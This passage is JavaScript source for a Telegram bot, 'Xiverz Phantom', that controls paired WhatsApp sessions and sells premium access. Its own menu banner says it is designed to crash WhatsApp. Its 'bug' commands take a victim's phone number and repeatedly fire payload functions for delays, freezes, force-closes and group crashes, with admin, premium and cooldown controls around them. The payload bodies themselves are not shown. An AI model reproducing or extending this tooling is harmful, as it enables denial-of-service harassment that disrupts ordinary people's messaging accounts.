            const m = Math.floor(sec / 60);
            const s = String(sec % 60).padStart(2, "0");
            return `${m}:${s}`;
        };

        const caption = `<blockqoute>JavaScript
🎧 SPOTIFY MUSIC - XiverzPhantom

🎵 Title      : ${result.title}
🎤 Artist     : ${result.author || "Unknown"}
⏱ Duration   : ${formatDuration(result.duration)}
📅 Release    : ${result.uploadDate || "Unknown"}
🔗 Source     : ${result.source}

────────────────────
🚀 Powered By XvZ Team
</blockqoute>`;

        await ctx.replyWithAudio(
            {
                source: fs.createReadStream(filePath)
            },
            {
                title: result.title,
                performer: result.author || "Unknown Artist",
                caption,
                parse_mode: "HTML"
            }
        );

        fs.unlinkSync(filePath);

        await ctx.telegram.deleteMessage(chatId, loading.message_id);

    } catch (err) {
        console.error(err);

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "❌ Terjadi kesalahan saat memproses lagu."
        );
    }
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

function readSavedPairing(index) {
    migrateLegacySession(index);
    const credsPath = path.join(getSessionPath(index), 'creds.json');
    if (!fs.existsSync(credsPath)) return null;

    try {
        const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
        const number = creds?.me?.id?.split(':')[0]?.split('@')[0] || '-';
        return {
            registered: Boolean(creds?.registered),
            number
        };
    } catch (error) {
        return { registered: false, number: '-', invalid: true };
    }
}

bot.command(['listpair', 'listpairs', 'sessions'], async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply('❌ ☇ Akses hanya untuk pemilik');
    }

    const rows = [];
    for (let index = 1; index <= MAX_SESSIONS; index++) {
        const saved = readSavedPairing(index);
        const state = sessionStates.get(index);
        const label = getSessionLabel(index);
        const location = `src/${getSessionName(index)}`;

        let status = 'Kosong';
        if (saved?.invalid) status = 'Data rusak';
        else if (activeSessionIndex === index && state?.status === 'open') status = 'Sender aktif';
        else if (state?.status === 'open') status = 'Terhubung standby';
        else if (saved?.registered) status = 'Terdaftar / offline';
        else if (saved) status = 'Belum selesai pairing';

        rows.push(`${label}\n  Nomor: ${saved?.number || '-'}\n  Status: ${status}\n  Folder: ${location}`);
    }

    await ctx.reply(
        `<b>DAFTAR SESSION PAIRING</b>\n\n${rows.join('\n\n')}\n\nTotal slot: ${MAX_SESSIONS}`,
        { parse_mode: 'HTML' }
    );
});

bot.command("reconnect", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = fs.readdirSync(sessionRoot, { withFileTypes: true })
      .filter((entry) => entry.isDirectory() && /^session\d*$/.test(entry.name))
      .map((entry) => path.join(sessionRoot, entry.name));

    const legacySessionDirs = fs.readdirSync(__dirname, { withFileTypes: true })
      .filter((entry) => entry.isDirectory() && /^session\d*$/.test(entry.name))
      .map((entry) => path.join(__dirname, entry.name));
    let deleted = false;

    for (const dir of [...sessionDirs, ...legacySessionDirs]) {
      fs.rmSync(dir, { recursive: true, force: true });
      deleted = true;
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgc', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgc -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgc', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgc -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const keyboardIntervals = {};
const knownPanels = new Map();

function rememberPanel(chatId, messageId, caption) {
  if (!chatId || !messageId || !caption) return;
  knownPanels.set(`${chatId}:${messageId}`, { chatId, messageId, caption });
}

async function updateKnownPanels() {
  const senderStatus = senderConnectionStatus === 'connected'
    ? '1 Connected'
    : senderConnectionStatus === 'reconnecting'
      ? 'Restarting'
      : '0 Connected';
  const senderYesNo = senderConnectionStatus === 'connected'
    ? 'Yes'
    : senderConnectionStatus === 'reconnecting'
      ? 'Restarting'
      : 'No';

  for (const [key, panel] of knownPanels) {
    const updatedCaption = panel.caption
      .replace(/(│✧ Sender: )(?:Yes|No|Restarting)/g, `$1${senderYesNo}`)
      .replace(/(│✧ Sender: )(?:\d+ Connected|Restarting)/g, `$1${senderStatus}`);

    if (updatedCaption === panel.caption) continue;

    try {
      await bot.telegram.editMessageCaption(
        panel.chatId,
        panel.messageId,
        undefined,
        updatedCaption,
        { parse_mode: 'HTML' }
      );
      panel.caption = updatedCaption;
    } catch (error) {
      const description = error?.response?.description || '';
      if (/message to edit not found|message can't be edited|message is not modified/i.test(description)) {
        knownPanels.delete(key);
      }
    }
  }
}

function randomColor() {
  const colors = [

    [
        [
            {
                text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂",
                callback_data: "/bug", 
                style: "success", 
                icon_custom_emoji_id: "5267231489610760977"
            },
            {
                text: "𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗠𝗲𝗻𝘂",
                callback_data: "/controls", 
                style: "success", 
                icon_custom_emoji_id: "5267414691440771593"
            },
        ],
        [
            {
                text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
                url: "https://t.me/AlipzzyOfficiaL", 
                style: "success", 
                icon_custom_emoji_id: "5267186839130753795"
            },    
        ],
        [ 
            {   text: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼",
                callback_data: "/tqto", 
                style: "success", 
                icon_custom_emoji_id: "5267198388297810634"
            },
            {
                text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂",
                callback_data: "/tools", 
                style: "success", 
                icon_custom_emoji_id: "5267199410500028294"
            },
        ],
        [
            {
                text: "𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", 
                url: "https://t.me/XiverzPhantomTeam", 
                style: "success", 
                icon_custom_emoji_id: "5265192393757443515"           
            },
        ]
    ],

    [
        [
            {
                text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂",
                callback_data: "/bug", 
                style: "danger", 
                icon_custom_emoji_id: "5267231489610760977"
            },
            {
                text: "𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗠𝗲𝗻𝘂",
                callback_data: "/controls", 
                style: "danger", 
                icon_custom_emoji_id: "5267414691440771593"
            },
        ],
        [
            {
                text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
                url: "https://t.me/AlipzzyOfficiaL", 
                style: "danger", 
                icon_custom_emoji_id: "5267186839130753795"
            },    
        ],
        [ 
            {   text: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼",
                callback_data: "/tqto", 
                style: "danger", 
                icon_custom_emoji_id: "5267198388297810634"
            },
            {
                text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂",
                callback_data: "/tools", 
                style: "danger", 
                icon_custom_emoji_id: "5267199410500028294"
            },
        ],
        [
            {
                text: "𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", 
                url: "https://t.me/XiverzPhantomTeam", 
                style: "danger", 
                icon_custom_emoji_id: "5265192393757443515"         
            },
        ]
    ],

    [
        [
            {
                text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂",
                callback_data: "/bug", 
                style: "primary", 
                icon_custom_emoji_id: "5267231489610760977"
            },
            {
                text: "𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗠𝗲𝗻𝘂",
                callback_data: "/controls", 
                style: "primary", 
                icon_custom_emoji_id: "5267414691440771593"
            },
        ],
        [
            {
                text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
                url: "https://t.me/AlipzzyOfficiaL", 
                style: "primary", 
                icon_custom_emoji_id: "5267186839130753795"
            },    
        ],
        [ 
            {   text: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼",
                callback_data: "/tqto", 
                style: "primary", 
                icon_custom_emoji_id: "5267198388297810634"
            },
            {
                text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂",
                callback_data: "/tools", 
                style: "primary", 
                icon_custom_emoji_id: "5267199410500028294"
            },
        ],
        [
            {
                text: "𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", 
                url: "https://t.me/XiverzPhantomTeam", 
                style: "primary", 
                icon_custom_emoji_id: "5265192393757443515"         
            },
        ]
    ]

  ];

  return colors[Math.floor(Math.random() * colors.length)];
}

function startBlink(ctx, chatId, messageId) {

  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
  }

  keyboardIntervals[chatId] = setInterval(async () => {
    try {

      await ctx.telegram.editMessageReplyMarkup(
        chatId,
        messageId,
        undefined,
        {
          inline_keyboard: randomColor()
        }
      );

    } catch {}

  }, 2500);
}

function stopBlink(chatId) {
  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
    delete keyboardIntervals[chatId];
  }
}

bot.start(async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const menuMessage = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗦𝗧𝗔𝗧𝗨𝗦 ───═⬡
│✧ Sender: ${senderStatus}
│✧ Runtime: ${runtimeStatus}
│✧ Memory: ${memoryStatus}
│✧ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡</blockquote>`;

const sent = await ctx.replyWithPhoto(videoUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: randomColor()
    }
  });

  const chatId = ctx.chat.id;
  rememberPanel(chatId, sent.message_id, menuMessage);
  startBlink(ctx, chatId, sent.message_id);
});
bot.action('/start', async (ctx) => {
    try {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);

    const menuMessage = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗦𝗧𝗔𝗧𝗨𝗦 ───═⬡
│✧ Sender: ${senderStatus}
│✧ Runtime: ${runtimeStatus}
│✧ Memory: ${memoryStatus}
│✧ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡</blockquote>`;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: videoUrl,
        caption: menuMessage,
        parse_mode: "HTML"
      },
      {
        reply_markup: {
          inline_keyboard: randomColor()
        }
      }
    );

    rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, menuMessage);
    startBlink(ctx, ctx.chat.id, ctx.callbackQuery.message.message_id);

    await ctx.answerCbQuery();

  } catch (error) {
    await ctx.answerCbQuery();
  }
});
bot.action('/controls', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown(); 
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);
    
    const controlsMenu = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗖𝗼𝗻𝘁𝗿𝗼𝗹𝗹 𝗠𝗲𝗻𝘂 ───═⬡
│✧ /connect
│╰─➤ ᴄᴏɴɴᴇᴄᴛ sᴇɴᴅᴇʀ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /reconnect
│╰─➤ ʀᴇsᴇᴛ sᴇssɪᴏɴ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /listpair
│╰─➤ ʟɪsᴛ sᴇssɪᴏɴ ᴘᴀɪʀɪɴɢ
│✧ /setcd
│╰─➤ sᴇᴛᴛɪɴɢs ᴄᴏᴏʟᴅᴏᴡɴ ʙᴏᴛ
│✧ /addadmin
│╰─➤ ᴀᴅᴅ ᴀᴄᴄᴇss ᴀᴅᴍɪɴ
│✧ /deladmin 
│╰─➤ ʀᴇᴍᴏᴠᴇ ᴀᴄᴄᴇss ᴀᴅᴍɪɴ
│✧ /addprem
│╰─➤ ᴀᴅᴅ ᴀᴄᴄᴇss ᴘʀᴇᴍɪᴜᴍ
│✧ /delprem
│╰─➤ ʀᴇᴍᴏᴠᴇ ᴀᴄᴄᴇss ᴘʀᴇᴍɪᴜᴍ
│✧ /spotify
│╰─➤ sᴇᴀʀᴄʜ ʟᴀɢᴜ
╰═─────────────═⬡</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, controlsMenu);
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/bug', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown(); 
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);

    const bugMenu = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂  ───═⬡
│✧ /ghost 
│╰─➤ ᴅᴇʟᴀʏ ʙᴇʙᴀs sᴘᴀᴍ
│✧ /xghost 
│╰─➤ ᴅᴇʟᴀʏ ʜᴀʀᴅ ɪɴᴠɪsɪʙʟᴇ
│✧ /xollow 
│╰─➤ ᴄʀᴀsʜ ᴍᴇssᴀɢᴇ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /xlite
│╰─➤ ғʀᴇᴇᴢᴇ x ʙʟᴀɴᴋ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /xburn
│╰─➤ ғᴏʀᴄᴇ ᴄʟᴏsᴇ ɪᴏs ɪɴᴠɪsɪʙʟᴇ
╰═─────────────═⬡

╭═───⊱ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂  ───═⬡
│✧ /xban [ Maintenance ]
│╰─➤ ʙᴀɴɴᴇᴅ ɢʀᴏᴜᴘ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /xslash
│╰─➤ ᴄʀᴀsʜ ɪɴᴠɪsɪʙʟᴇ ɢʀᴏᴜᴘ ᴡʜᴀᴛsᴀᴘᴘ
╰═─────────────═⬡</blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, bugMenu);
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/tools', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();  
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);
    
    const toolsMenu = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 ───═⬡
│✧ /cekid
│╰─➤ ᴄʜᴇᴄᴋ ɪᴅ ɢʀᴏᴜᴘ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /testfunc
│╰─➤ ᴛᴇsᴛ ғᴜɴᴄᴛɪᴏɴ ᴡʜᴀᴛsᴀᴘᴘ
╰═─────────────═⬡</blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, toolsMenu);
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/tqto', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();  
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);
    
    const tqtoMenu = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 ───═⬡
│✧ AlipzzyOfficiaL
│╰─➤ Developer
│✧ Yuukey
│╰─➤ Team Project
│✧ Dimzzzxzz
│╰─➤ Team Project
│✧ Danzvorever
│╰─➤ Team Project
╰═─────────────═⬡</blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, tqtoMenu);
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.command("cekid", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  try {
    const text = ctx.message.text;
    const link = text.split(" ")[1];

    if (!link)
      return ctx.reply("🪧 ☇ Format: /cekid https://chat.whatsapp.com/xxxxx");

    const match = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!match)
      return ctx.reply("❌ ☇ Link grup tidak valid");

    const inviteCode = match[1];

    if (!sock)
      return ctx.reply("❌ ☇ Socket belum siap");

    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id;
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await ctx.reply(`
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
│ ✧ Name
│ ╰─➤ ${subject}
│ ✧ Group ID
│ ╰─➤ ${groupId}
│ ✧ Owner
│ ╰─➤ ${owner}
│ ✧ Members
│ ╰─➤ ${size}
╰═─────────────═⬡</strong></blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    ctx.reply("❌ ☇ Gagal mengambil Id grup");
  }
});
/* COMMAND BUG #1 */
bot.command("ghost", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ghost 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: ghost
✧ Status: Success
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await XvZDelay(sock, target);
    awair XvZDelayV2(sock, target);
    await sleep(2500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: ghost
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
/* COMMAND BUG #2 */
bot.command("xghost", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xghost 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xghost
✧ Status: Success
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 70; i++) {
    await XvZDelay(sock, target);
    await XvZDelayV1(sock, target);
    await XvZDelayV2(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xghost
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
/* COMMAND BUG #3 */
bot.command("xollow", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xollow 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xollow
✧ Status: Success
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 50; i++) {
    await XvZFc(sock, target);
    await XvZFcV1(sock, target);
    await XvZFcV2(sock, target);
    await sleep(1000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xollow
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
